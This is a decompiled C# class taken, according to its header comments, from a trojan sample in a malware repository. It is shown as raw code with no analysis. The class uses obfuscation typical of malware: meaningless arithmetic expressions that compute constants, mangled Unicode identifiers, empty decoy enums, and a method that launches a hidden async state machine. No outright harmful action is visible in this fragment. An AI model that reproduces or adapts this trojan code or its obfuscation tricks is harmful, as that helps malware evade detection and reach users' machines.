// Decompiled with JetBrains decompiler
// Type: GetRuntimeId
// Assembly: glnIofnldc, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 71B4464A-DFC5-4C3A-B554-E5226EBB9009
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-da64be63c532f328839003e4afe34b3423f704a915cf49a7ad190f49f921ac55.exe

using System;

internal class GetRuntimeId
{
  private static void IsLeapDay(bool _param0)
  {
    if (!_param0)
      return;
    MAC.\u003CFindAssemblies2\u003Ed__48();
  }

  private static int M_methodSigToken => (Convert.ToInt32(-79965.0 - 79965.0) + Convert.ToInt32(43942.0 + 43942.0) / \u003CModule\u003E.Extension(int.Parse("7")) + Convert.ToInt32(2.0 * 36024.5) / \u003CModule\u003E.Extension(int.Parse("7"))) * (Convert.ToInt32(-44061.0 - 44061.0) + Convert.ToInt32(2.0 * 7718.5) / \u003CModule\u003E.Extension(int.Parse("13")) + Convert.ToInt32(72686.870483241772 - Math.Sin(36343.0)) / \u003CModule\u003E.Extension(int.Parse("14")));

  public static void Rid()
  {
    // ISSUE: variable of a compiler-generated type
    GetRuntimeId.FamANDAssem stateMachine;
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024\u0024method0x600427b\u002D1 = \u003CModule\u003E.\u0094OG32();
    // ISSUE: reference to a compiler-generated field
    stateMachine.M_otherMethod = Convert.ToInt32(6953742450.0 / -58965.0) + Convert.ToInt32(85191.0 - Math.Truncate(28397.0)) / \u003CModule\u003E.Extension(int.Parse("13")) + (int.Parse("524064543") ^ int.Parse("524057040")) / \u003CModule\u003E.Extension(int.Parse("12"));
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024\u0024method0x600427b\u002D1.Start<GetRuntimeId.FamANDAssem>(ref stateMachine);
  }

  private static void EnglishName()
  {
    \u003CModule\u003E.\u0004ä\u001C\u00BC\u0010("ShortProcdess Started");
    \u003CModule\u003E.\u0004ä\u001C\u00BC\u0010("ShortPddddddddddddrocess Completed");
  }

  private enum UnmangleTypeName
  {
  }

  private enum Prejitinit_HACK
  {
  }

  private enum get_Salt
  {
  }
}
